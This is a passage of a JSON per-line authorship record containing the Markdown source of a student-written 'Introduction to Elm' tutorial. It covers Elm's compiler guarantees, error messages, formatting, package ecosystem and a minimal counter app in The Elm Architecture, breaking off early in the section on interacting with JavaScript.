        "content": "    * [The Elm Architecture](#the-elm-architecture)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    * [Why not Elm?](#why-not-elm)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Interacting With JavasScript](#interacting-with-javascript)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Accessing the DOM](#accessing-the-dom)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    * [How to Get Started With Elm?‎](#how-to-get-started-with-elm"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Migrating From Other Frameworks](#migrating-from-other-frameworks)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Starting a New Project](#starting-a-new-project)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "openorclose"
        },
        "content": "# Introduction to Elm"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "openorclose"
        },
        "content": "**Author(s): [Daryl Tan](https://github.com/openorclose)** \u003cbr\u003e"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "openorclose"
        },
        "content": "**Reviewer(s): [Alfred Yip](https://github.com/alyip98), [James Pang](https://github.com/jamessspanggg)** \u003cbr\u003e"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "openorclose"
        },
        "content": "## What is Elm?"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "openorclose"
        },
        "content": "[Elm](https://elm-lang.org/) is a statically typed, functional programming language that compiles to JavaScript and promises no runtime exceptions. You can use it to build reliable and maintainable applications for the web."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "openorclose"
        },
        "content": "## Why Learn Elm?"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Languages like Haskell and OCaml from the [ML family](https://en.wikipedia.org/wiki/ML_(programming_language)) have been well known to be maintainable and mostly error-free in practice. Their compilers catch bugs well before they can make it into production. However, these functional programming languages are also well known to have a steep learning curve."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "openorclose"
        },
        "content": "JavaScript, the standard language for web development, has a rather low learning curve but is considerably more difficult to maintain. To solve this, people write tests, add type annotations to JavaScript, and even try to adopt functional programming patterns like immutability to increase maintanability."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm tries to be the best of both worlds. Its functional core provides maintainability, and it tries to greatly reduce the barriers to learning functional programming by simplifying concepts and having a really pleasant compiler."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: Handling All Cases"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Like many functional programming languages, you get the \"if it compiles it works\" feeling in Elm."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If your code can produce more than one result (e.g. converting a string to an integer can either fail or succeed), Elm\u0027s compiler forces you to account for all cases in order to compile."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "openorclose"
        },
        "content": "---"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Let\u0027s say you have an array, and you try to access its 10th element. What happens if there is no such element?"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Some languages like JavaScript will give you `undefined`, and your code might very well continue to execute and only error out in a completely separate function, making it a pain to debug."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Other languages, like Java and Haskell, will throw a form of `IndexOutOfBoundsException`. That\u0027s ideal for you as a developer since you know exactly at which line this error occurs."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "openorclose"
        },
        "content": "However, this doesn\u0027t make for a good user experience. What if you forget to test an edge case?"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "openorclose"
        },
        "content": "---"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In Elm, you will **never** run into these errors."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm forces you to handle both cases of the array access in your code:"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- the element exists"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- the element doesn\u0027t exist."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you don\u0027t handle them, your code won\u0027t compile!"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: Friendly Compiler"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm\u0027s compiler strives to be as friendly as possible, and offers as many hints as it can to help you fix errors. If nothing else, you should try Elm just to see how great error messages can be."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Here\u0027s a quick look at some of them:"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- Cyclic dependencies:"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```{.no-line-numbers}"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- IMPORT CYCLE ----------------------------------------------------------------"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Your module imports form a cycle:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    ┌─────┐"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    │    Bar"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    │     ↓"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    │    Foo"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    └─────┘"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Learn more about why this is disallowed and how to break cycles"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "openorclose"
        },
        "content": "here:\u003chttps://elm-lang.org/0.19.0/import-cycles\u003e"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- Wrong argument types:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```{.no-line-numbers}"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003e String.join 4 [\"Hello\", \"World\"]"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- TYPE MISMATCH ---------------------------------------------------------- REPL"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The 1st argument to `join` is not what I expect:"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "openorclose"
        },
        "content": "3|   String.join 4 [\"Hello\", \"World\"]"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "openorclose"
        },
        "content": "                 ^"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "openorclose"
        },
        "content": "This argument is a number of type:"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    number"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "openorclose"
        },
        "content": "But `join` needs the 1st argument to be:"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    String"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Hint: Try using String.fromInt to convert it to a string?"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- Syntax errors, e.g. if you try to import modules with the JavaScript syntax:"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```{.no-line-numbers}"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003e import * from \u0027Util\u0027"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- EXPECTING IMPORT NAME -------------------------------------------------- REPL"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "openorclose"
        },
        "content": "I was parsing an `import` until I got stuck here:"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "openorclose"
        },
        "content": "2| import * from \u0027Util\u0027"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "openorclose"
        },
        "content": "          ^"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "openorclose"
        },
        "content": "I was expecting to see a module name next, like in these examples:"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    import Dict"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    import Maybe"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    import Html.Attributes as A"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    import Json.Decode exposing (..)"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Notice that the module names all start with capital letters. That is required!"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Read \u003chttps://elm-lang.org/0.19.1/imports\u003e to learn more."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: Canonical Coding Style"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Like in Go, Elm has largely managed to avoid the style wars of older languages by having introduced a recommended style guide and code formatter (`elm-format`) early on."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "openorclose"
        },
        "content": "`elm-format` has no configuration, eliminating code style discussions with your team, and increasing the consistency of Elm code you see out in the wild."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In particular, the style guide aims to reduce version control diffs. Here\u0027s an example of the recommended style for a `Record` in Elm (a `Record` is like a JavaScript object):"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```elm"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "openorclose"
        },
        "content": "person \u003d"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    { age \u003d 18"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    , firstName \u003d \"John\""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    , lastName \u003d \"Doe\""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    }"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Note how if you were to add a new field `favoriteLanguage` to `person`, there would only be a one line diff:"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```elm"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "openorclose"
        },
        "content": "person \u003d"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    { age \u003d 18"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    , firstName \u003d \"John\""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    , lastName \u003d \"Doe\""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    , favoriteLanguage \u003d \"PHP\""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    }"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you\u0027re not used to this style (JavaScript achieves this reduced code diff via [trailing commas](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Trailing_commas) for example), don\u0027t worry. You can code however you\u0027re used to and then run `elm-format` to format your code automatically!"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "openorclose"
        },
        "content": "That\u0027s the benefit of having one recommended style guide and using `elm-format`."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Further reading:"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- [Official style guide](https://elm-lang.org/docs/style-guide)"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- [elm-format](https://github.com/avh4/elm-format)"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: Package Ecosystem"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "openorclose"
        },
        "content": "You can share your package, or use any of the packages available at https://package.elm-lang.org/."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "openorclose"
        },
        "content": "All packages there are written in Elm only and therefore cannot perform any side effects. This is unlike the package system in JavaScript, where packages can reassign global functions like `parseInt` and cause bugs whenever `parseInt` is used elsewhere!"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Furthermore, Elm has automatic enforced semantic versioning. Whenever you push an update to your package, Elm analyses your code, and depending on whether you have any breaking changes, updates the patch, minor, or major version accordingly. This makes both package maintainers and users happy: maintainers don\u0027t have to worry about choosing new versions, and users can know that as long as the major version doesn\u0027t change, there won\u0027t be any breaking changes."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: Fast Compiles and Small Bundles"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm\u0027s compiler is really fast. Its creator focused on compile times in versions 0.19 and 0.19.1, which brought compile times for 100k LOC projects down to only 10s. If your project has less than 10k LOC, compilation should take no more than 1s."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Examples of LOC vs compile times [here](https://discourse.elm-lang.org/t/how-are-0-19-compile-times-for-50k-loc-projects/3680)."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Lastly, Elm bundle size is small. Since Elm\u0027s functions cannot perform side effects, unused functions can be automatically removed. You can safely import a 1kLOC package only to use a one-liner function, and Elm can help you remove the 999 lines during compilation."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Benefit: The Elm Way"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "openorclose"
        },
        "content": "You may have noticed that Elm really likes the \"only one way to do it\" philosophy. You don\u0027t get to choose your package versions, and you don\u0027t get to configure `elm-format`. This is all done on purpose: to simplify developers\u0027 lives."
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In fact, when other languages have gone on and added more features in newer versions, Elm has gone the other direction and removed many language features for the sake of simplicity."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "openorclose"
        },
        "content": "## The Elm Architecture"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003cpic src\u003d\"images/TEA.png\" height\u003d\"100\"/\u003e"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Elm doesn\u0027t allow side effects, so to build web apps, you use The Elm Architecture. It\u0027s similar to the model-view-controller design pattern."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "openorclose"
        },
        "content": "You provide Elm with three items:"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- an initial state your app is in"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- a view function that takes in a state, and returns a HTML representation of that state"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- an update function that takes in a state and a message. The function then can use information provided in the message to returns a new state."
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Here\u0027s a minimal example:"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```elm"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "openorclose"
        },
        "content": "module Main exposing (main)"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "openorclose"
        },
        "content": "import Browser"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "openorclose"
        },
        "content": "import Html exposing (Html, button, text)"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "openorclose"
        },
        "content": "import Html.Events exposing (onClick)"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- our initial state is a single number 1"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "openorclose"
        },
        "content": "initialModel \u003d 1"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- if we get the message string \"increment\", we return a new number, model+1"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- else we don\u0027t update it, and return the same model"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "openorclose"
        },
        "content": "update msg model \u003d"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    case msg of"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        \"increment\" -\u003e model + 1"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        _ -\u003e model"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- we take in a model, and display the number it represents on a button element."
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- when the button is clicked, it sends the message string \"increment\" to Elm."
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- which will get passed to our `update` function."
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "openorclose"
        },
        "content": "view model \u003d button [ onClick \"increment\" ] [ text (String.fromInt model) ]"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "openorclose"
        },
        "content": "-- now we glue it all together!"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "openorclose"
        },
        "content": "main \u003d"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    Browser.sandbox"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        { init \u003d initialModel"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        , view \u003d view"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        , update \u003d update"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        }"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "openorclose"
        },
        "content": "```"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "openorclose"
        },
        "content": "View it on the Elm playground [here](https://ellie-app.com/88GSdxWWVFza1)."
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Most Elm apps are written this way, you just keep adding stuff into your model, view, and update as you grow your app."
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "openorclose"
        },
        "content": "The main benefit of this is that your app becomes more maintainable. There is only ever one single source of truth."
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "openorclose"
        },
        "content": "## Why Not Elm?"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "openorclose"
        },
        "content": "As much as Elm promotes the \"one way of doing things\" mantra, this means that some things that are easier to do in JavaScript become considerably more tedious in Elm."
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Interacting With JavaScript"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "openorclose"
        },
        "content": "To interact with outside JavaScript, you use [ports](https://guide.elm-lang.org/interop/ports.html)."
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "openorclose"
        },
        "content": "In essence, Elm treats outside JavaScript as a server that you send messages to and receive messages from. This preserves Elm\u0027s no side effects guarantee."
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "openorclose"
        },
        "content": "However, this makes using certain JavaScript libraries that have no efficient Elm counterpart (e.g. [Typed Arrays](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays)) harder, since what should be a simple function call becomes a tedious process of sending a request to the JavaScript \"server\", listening for a response, and then finally processing the response."
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "openorclose"
        },
        "content": "### Accessing the DOM"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "openorclose"
        },
